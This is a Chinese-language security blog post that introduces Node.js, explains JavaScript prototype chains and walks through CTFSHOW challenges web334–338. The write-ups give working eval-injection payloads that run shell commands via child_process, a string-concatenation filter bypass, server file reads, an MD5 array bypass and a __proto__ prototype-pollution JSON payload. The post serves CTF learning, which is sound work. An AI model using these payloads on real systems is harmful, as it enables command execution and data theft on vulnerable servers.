# NodeJS从零开始到原型链污染

阅读量 **313080**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-20 10:30:40

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t011089ec50e5a93be5.jpg)

## 前言

因为近段时间包括去年，在打CTF的时候确实有遇到NodeJS的题目，但是从来没系统学习，所以拿到题很懵。不知道应该从什么地方入手，所以决定去学习一下，但是之前没怎么学过JavaScript，语法之类的更是不懂，所以在此之前，花了三五天的时间，一边做题一边恶补了JavaScript的基础。  
才开始写这篇文章。

## NodeJS基础

简单介绍（ ~~多一句嘴，确实是从零基础开始的~~ ）：

> Node.js 是一个基于 Chrome V8 引擎的 Javascript 运行环境

但是它是由C++开发的，它只是一个JavaScript语言解释器。  
REPL环境运行JavaScript的代码

![](https://p3.ssl.qhimg.com/t0111a6f3bb245e3e57.png)

在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。  
在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。  
这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。

###  读取文件操作

文件系统模块就是核心模块

![](https://p0.ssl.qhimg.com/t01b5e80630c79ab038.png)

    
    
    var fs = require('fs');//导入fs模块
    fs.readFile('./haha.txt','utf8',function(err,data){
        console.log(err);
        console.log('---分界线----');
        console.log(data);
    });
    console.log("wuhu");
    

读取文件的操作，在下面CTF例题中会用到。读取文件的各种姿势。  
在[这里](http://nodejs.cn/api/fs.html)了解更多读取文件的函数和使用。

###  同步和异步

区别：

> 同步方法： 等待每个操作完成，然后只执行下一个操作  
>  异步方式： 从不等待每个操作完成，而是只在第一步执行所有操作

看到一个比较有趣的描述：

> 同步： 可以拿吃饭和看电视来举例子，同步就是先吃完饭，吃完饭后再看电视，不能边看边吃，这就是同步  
>  异步： 同样拿上边的例子来说，异步就是边吃饭边看电视，看电视和吃饭同时进行，这样举例就应该很清楚了

还用上面的代码做例子，readFile()是异步操作，所以其运行结果为

![](https://p5.ssl.qhimg.com/t010ccc962ebec15e41.png)

同步例子：

    
    
    var fs = require('fs');//导入fs模块
    a = fs.readFileSync('./haha.txt');
    console.log(a.toString());
    console.log("wuhu");
    

![](https://p2.ssl.qhimg.com/t01e075e16ec4a36ff1.png)

可以很明显的看出来下面阻塞代码程序是正常的同步加载，代码由上到下执行。上面这个异步（非阻塞）代码程序会先输出下面的console.log()然后才执行回掉函数里的代码。

###  全局变量

  1. __dirname：当前模块的目录名。
  2. __filename：当前模块的文件名。 这是当前的模块文件的绝对路径（符号链接会被解析）。
  3. exports变量是默认赋值给`module.exports`，它可以被赋予新值，它会暂时不会绑定到module.exports。
  4. module：在每个模块中， `module` 的自由变量是对表示当前模块的对象的引用。 为方便起见，还可以通过全局模块的 `exports` 访问 `module.exports`。 module 实际上不是全局的，而是每个模块本地的
  5. require模块就不多说了，用于引入模块、 JSON、或本地文件。 可以从 node_modules 引入模块。

    
    
    // 引入 JSON 文件：
    const jsonData = require(‘./path/filename.json’);
    
    // 引入 node_modules 模块或 Node.js 内置模块：
    const crypto = require(‘crypto’);

自己设置

    
    
    global.something = 123;

![](https://p2.ssl.qhimg.com/t016be06bc7743ddc6a.png)

经常使用的全局变量是`__dirname`、`__filename`

###  HTTP服务

    
    
     //引入http核心模块
    var http = require('http');
    //创建一个服务
    var server = http.createServer();
    //绑定连接
    server.on('request',function(res,rs){
        console.log(res.method);//打印请求的方法
        rs.write('hello,world!');//返回数据
        rs.end();//断开连接
    })
    //启动监听
    server.listen(4444,function(){
        console.log('请访问127.0.0.1:4444');
    

启动运行该文件，访问指定端口，HTTP服务的网页就显示出来了。

![](https://p5.ssl.qhimg.com/t0173a354994daed3b9.png)

###  child_process(创建子进程)

child_process提供了几种创建子进程的方式

> 异步方式：spawn、exec、execFile、fork  
>  同步方式：spawnSync、execSync、execFileSync

经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。  
在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。  
同步创建进程可以使用`child_process.spawnSync()`、`child_process.execSync()` 和
`child_process.execFileSync()` ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。

## JavaScript原型链

###  原型和原型链

首先要知道，JavaScript没有父类和子类这个概念，也没有类和实例的区分，而JavaScript中的继承关系则是靠一种很奇怪的“原型链”模式来实现继承。  
在次之前，要先搞清楚对象和函数有什么区别和联系。

> 对象是由函数创建的，而函数又是另一种对象。

####  JavaScript中的对象

在JavaScript中几乎所有的事物都是对象，如下代码：

    
    
    var a = {
        "name": "m0re",
        "blog": "https://m0re.top"
    }
    a.name;
    a.blog;
    console.log(a);
    

其中访问对像的属性，可以有两种方式：

    
    
    //例如
    a.name;
    a["name"];
    

####  原型的定义和继承

原型的定义：

> 任何对象都有一个原型对象，这个原型对象由对象的内置属性proto指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的
    
    
    function a(name,age){
        this.name = name;
        this.age = age;
    }
    

a函数内容是a类的构造函数，其中`this.name`、`this.age`就是a类的属性。

在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性`prototype`指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。

![](https://p3.ssl.qhimg.com/t01d957a005ca69d4cf.png)

创建一个对象a，对象a会默认有一个属性 **proto** 指向构造函数A的原型对象b

![](https://p4.ssl.qhimg.com/t01b67f5f2ef9dc8807.png)

这里`A.prototype`就指向函数的原型B。则`a.__proto__`是实例化的对象a的一个属性。  
在javascript中，一切都是对象，他也只有对象这一种结构。而对象和对象间又存在继承关系。

    
    
    var test = {
        a:1 ,
        b: function(){
            console.log(this.a);
      }
    };
    var c = Object.create(test);//c继承test
    
    c.a=888;//继承test的变量
    c.b();//继承test的函数
    

> 每个实例对象(object)都有一个私有属性( **proto**
> )指向它的构造函数的原型对象(prototype)，每个实例对象还有一个属性(constructor)指向原型的构造函数。该原型对象也有一个自己的原型对象(
> **proto** )，层层向上直到一个对象的原型对象为null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。

经过不断调用，最终的原型对象会调用到null，这将作为该原型链的最后一个环节，与之对应的，作为终点的 null 自然也是没有原型对象的。

![](https://p0.ssl.qhimg.com/t019adfff41bce41898.png)

####  原型链定义及如何污染

原型链的核心就是依赖对象 **proto**
的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object的原型null为止。

![](https://p3.ssl.qhimg.com/t01fe584fd8c87e7c9b.png)

> 由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向
> null，若此时还未找到就会返回 undefined

图中的原型链是 cat->Cat.protype->Object.prototype->null

![](https://p5.ssl.qhimg.com/t011cffd77e8d3ec6c6.png)

原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。  
由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。  
因此我们可以通过 a [“ **proto** “] 的方式去访问其原型对象。

![](https://p1.ssl.qhimg.com/t0158013db9bd336e31.png)

调用对象属性时, 会查找属性，如果本身没有，则会去 **proto**
中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有 **proto** ，那么会去 **proto**
的显式原型中查找，一直到null。  
p神的文章中提到[JavaScript原型链继承](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)

## CTF题目实战

###  NodeJS简单类型的题目以及常见绕过

搜集了一下，做个总结，方便自己以后查阅。前面的题目没有涉及到原型链污染，不过也是学到了许多知识。

####  web334

源码下载下来后，发现user.js和login.js  
其中user.js中发现了用户名和密码  
CTFSHOW 123456  
然后看到login.js中，

    
    
    var express = require('express');
    var router = express.Router();
    var users = require('../modules/user').items;
    
    var findUser = function(name, password){
      return users.find(function(item){
        return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
      });
    };
    /* GET home page. */
    router.post('/', function(req, res, next) {
      res.type('html');
      var flag='flag_here';
      var sess = req.session;
      var user = findUser(req.body.username, req.body.password);
    
      if(user){
        req.session.regenerate(function(err) {
          if(err){
            return res.json({ret_code: 2, ret_msg: '登录失败'});        
          }
    
          req.session.loginUser = user.username;
          res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
        });
      }else{
        res.json({ret_code: 1, ret_msg: '账号或密码错误'});
      }  
    
    });
    module.exports = router;
    

其中

    
    
    var findUser = function(name, password){
      return users.find(function(item){
        return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
      });
    };
    

CTFSHOW 为name，经过name.toUpperCase()处理后变大写。所以此处如果想让用户名为CTFSHOW，就需要控制输入为ctfshow。  
所以最后输入用户名为ctfshow 密码为：123456  
即可登陆成功getflag

####  web335

参考博客 <https://blog.csdn.net/miuzzx/article/details/111780832>  
注释为`/eval`  
`eval`是为执行命令的关键词，所以这里猜想是可以进行命令执行。  
所以就去`/javascripts/jquery.js`中查找`eval`的语句，但是没get到点。所以看了大师傅的博客，得到了思路。

![](https://p1.ssl.qhimg.com/t0103c48a92de93f708.png)

做的题少就是不行。  
然后师傅给了两个payload。

> require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()

child_process(子进程)  
该模块提供了衍生子进程（以一种与popen(3)类似但不相同的方式）的能力。此功能主要是由 `child_process.spawn()`函数提供。  
此处使用同步进程：三个方法，他们会阻塞NodeJS事件循环、暂停任何其他代码的执行，知道衍生的进程退出。  
`child_process.spawnSync()`、`child_process.execSync()` 和
`child_process.execFileSync()`  
这里学习了两个方法可以用来解答这道题。具体的我将其记录在了NodeJS学习分组文章Day1  
这里直接进行

#####  第一种方法

![](https://p0.ssl.qhimg.com/t019449ab7cbba6cd1c.png)

然后cat fl00g.txt即可

![](https://p0.ssl.qhimg.com/t014f904d912d9b85a5.png)

还有就是上面那个payload了  
总：

> first  
>  require( “child_process” ).spawnSync( ‘ls’, [ ‘/‘ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘f*’ ] ).stdout.toString()  
>  second  
>  require(“child_process”).execSync(‘ls’)  
>  require(“child_process”).execSync(‘cat fl00g.txt’)

#####  第二种方法

参考群里Y4师傅的博客

> global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)
>
> ####  web336
>
> ?eval=require(“child_process”).spawnSync(‘ls’).stdout.toString()  
>  ?eval=require( ‘child_process’ ).spawnSync( ‘cat’, [ ‘fl001g.txt’ ]
> ).stdout.toString()

直接使用这个就可以，但是，我用另一个方法时，发现了过滤。

![](https://p3.ssl.qhimg.com/t01efd146900371e15b.png)

这里发现使用335的另外两种方法都不行，然后看Y4师傅的姿势，  
这里是由好多方法，整理了一下，为方便理解，由易到难来记录。

#####  第一种

读取文件，通过全局变量读取当前目录位置  
`__filename`  
然后查找资料看看还有什么其他的全局变量  
`__dirname` 表示当前执行脚本所在的目录。  
1、`global`: nodejs中的顶层对象，相当于前端js的window  
2、`__dirname`: 超全局变量/魔术变量，用于获取当前执行文件的所在目录  
3、`__filename`: 超全局变量/魔术变量，用于获取当前执行文件的绝对路径  
查看当前文件的绝对路径。

![](https://p2.ssl.qhimg.com/t01f30445937bd39266.png)

然后可以看到文件名，然后读取当前目录下的内容。

使用`fs.readdirSync()`

![](https://p0.ssl.qhimg.com/t01845de81c566a7552.png)

发现了fl001g.txt  
直接读取该文件

![](https://p4.ssl.qhimg.com/t013a3e126f3cabaa4d.png)

#####  第二种

然后根据大佬思路，读取该文件的源码，看看是过滤了什么内容。

![](https://p5.ssl.qhimg.com/t010f79faaab6e039ad.png)

payload为

    
    
    ?require("fs").readFileSync('/app/routes/index.js','utf-8')
    

源码：

    
    
    var express = require('express'); 
    var router = express.Router(); /* GET home page. */ 
    router.get('/', function(req, res, next) { 
      res.type('html'); 
      var evalstring = req.query.eval; 
      if(typeof(evalstring)=='string' && evalstring.search(/exec|load/i)>0){ 
        res.render('index',{ title: 'tql'}); 
      }else{ res.render('index', { title: eval(evalstring) }); 
    } 
    });
    module.exports = router;
    

可以看出是在 if(typeof(evalstring)==’string’ && evalstring.search(/exec|load/i)>0){  
这里进行过滤，过滤了exec和load，进行编码绕过

![](https://p3.ssl.qhimg.com/t01737946c2622f8171.png)

在本地测试后发现是可以进行拼接的。  
在浏览器中，+会被解析成空格，所以要先将+进行编码。

    
    
    require("child_process")['exe'%2B'cSync']('ls')
    

![](https://p3.ssl.qhimg.com/t01bac24ad104dc1655.png)

#####  第三种

直接使用

> require( “child_process” ).spawnSync( ‘ls’, [ ‘.’ ] ).stdout.toString()  
>  require( “child_process” ).spawnSync( ‘cat’, [ ‘fl00g.txt’ ]
> ).stdout.toString()

这个方法正好不在过滤范围内。可以直接使用。

####  web337

    
    
    var express = require('express');
    var router = express.Router();
    var crypto = require('crypto');
    
    function md5(s) {
      return crypto.createHash('md5')
        .update(s)
        .digest('hex');
    }
    
    /* GET home page. */
    router.get('/', function(req, res, next) {
      res.type('html');
      var flag='xxxxxxx';
      var a = req.query.a;
      var b = req.query.b;
      if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
        res.end(flag);
      }else{
        res.render('index',{ msg: 'tql'});
      }
    
    });
    
    module.exports = router;
    

这里使用数组绕过MD5比较，还有a和b的长度比较。

![](https://p3.ssl.qhimg.com/t0147fb6ec7625083b7.png)

最后输出都是`[object Object]flag{xxx}`  
所以可以使用数组来绕过。  
paylaod：`a[x]=1&b[x]=2`

![](https://p2.ssl.qhimg.com/t01868eefa1e61b1490.png)

####  web338(原型链污染)

这个是一道入门题目，源码都给了，在源码中查看，找到了login.js，发现了getflag的关键处。

    
    
    /* GET home page.  */
    router.post('/', require('body-parser').json(),function(req, res, next) {
      res.type('html');
      var flag='flag_here';
      var secert = {};
      var sess = req.session;
      let user = {};
      utils.copy(user,req.body);
      if(secert.ctfshow==='36dboy'){
        res.end(flag);
      }else{
        return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
      }
    
    
    });
    //copy函数
    function copy(object1, object2){
        for (let key in object2) {
            if (key in object2 && key in object1) {
                copy(object1[key], object2[key])
            } else {
                object1[key] = object2[key]
            }
        }
      }
    

`utils.copy(user,req.body);`利用这里可实现原型链污染，使得`secret`继承`Object.prototype`

![](https://p0.ssl.qhimg.com/t01d65f9ef283667734.png)

payload:`{"username":"admin","password":"pass","__proto__":{"ctfshow":"36dboy"}}`  
secret继承了这里的ctfshow的值，所以就刚好使得if语句为true，登录成功。

## 总结

因为是从零基础开始学的NodeJS，所以零碎的基础知识有点多。

## 参考链接

<https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html>  
<https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/>  
<https://looaon.com/index.php/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/1110.html>  
<https://xz.aliyun.com/t/7182>  
<https://www.kitsch.live/2021/03/14/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/>  
<https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/>  
<http://purplet.top/2020/07/14/javascript%e5%8e%9f%e5%9e%8b%e3%80%81%e5%8e%9f%e5%9e%8b%e9%93%be%e5%8f%8a%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93/>  
<https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#>  
<https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **m0re** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/236182](/post/id/236182)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Javascript](/tag/Javascript)
  * [nodejs](/tag/nodejs)
  * [原型链](/tag/原型链)

 **+1** __7赞

 __收藏

![](https://p5.ssl.qhimg.com/t01efe206ae95ba0ec9.png) m0re

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

